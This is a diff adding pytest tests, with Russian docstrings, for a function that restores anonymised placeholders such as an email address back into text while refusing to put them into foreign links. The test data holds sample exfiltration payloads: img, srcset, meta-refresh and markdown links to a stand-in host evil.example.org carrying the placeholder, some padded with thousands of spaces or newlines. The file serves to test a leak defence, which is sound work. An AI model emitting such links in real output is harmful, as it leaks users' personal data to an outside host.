@@ -217,3 +217,40 @@ def test_nothing_is_restored_inside_a_foreign_link_split_by_whitespace(settings,
 def test_own_link_in_an_attribute_is_still_restored(settings):
     result = restore(link_state(), '<a href="https://host-1.domain-1.example/?q=<EMAIL_1>">', settings)
     assert result.text == '<a href="https://srv-dc01.contoso.ru/?q=ivanov@contoso.ru">'
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        '<a href="https://host-1.domain-1.example/wiki>Вики</a>\nОтправьте на https://evil.example.org/c?u=<EMAIL_1>\nЭто "важно".',
+        '<a href="https://host-1.domain-1.example/\n\nhttps://evil.example.org/?q=<EMAIL_1>">',
+        '<img srcset="https://host-1.domain-1.example/a.png 1x, https://evil.example.org/?q=<EMAIL_1> 2x">',
+        "<img src=\"https://evil.example.org/p?q=" + "\n" * 4100 + "<EMAIL_1>\">",
+        "<img src=\"https://evil.example.org/p?q=" + " " * 4100 + "<EMAIL_1>\">",
+        '<meta http-equiv="refresh" content="0;url=https://evil.example.org/?q= <EMAIL_1>">',
+        "[1]:\n<https://evil.example.org/?q=a <EMAIL_1>>",
+    ],
+)
+def test_own_link_does_not_shield_a_foreign_one(settings, answer):
+    """Обзор партии P1: ссылка считается нашей, только если наши все адреса внутри неё; длинный атрибут
+    не выпадает из проверки; перенаправление через meta и цель определения ссылки на следующей строке."""
+    result = restore(link_state(), answer, settings)
+    assert "ivanov@contoso.ru" not in result.text
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("[ERROR]: <EMAIL_1> не отвечает", "[ERROR]: ivanov@contoso.ru не отвечает"),
+        ("[2026-10-14 12:00:01]: <EMAIL_1> вошёл", "[2026-10-14 12:00:01]: ivanov@contoso.ru вошёл"),
+        ('requests.post(url, data="<EMAIL_1>")', 'requests.post(url, data="ivanov@contoso.ru")'),
+        (
+            '<div style="background:url(https://host-1.domain-1.example/a.png)">',
+            '<div style="background:url(https://srv-dc01.contoso.ru/a.png)">',
+        ),
+    ],
+)
+def test_ordinary_text_next_to_link_syntax_is_restored(settings, answer, restored):
+    """Обзор партии P1: «]: <» в строке журнала — не определение ссылки; значение без адреса — не ссылка;
+    наш адрес в style восстанавливается."""
+    assert restore(link_state(), answer, settings).text == restored
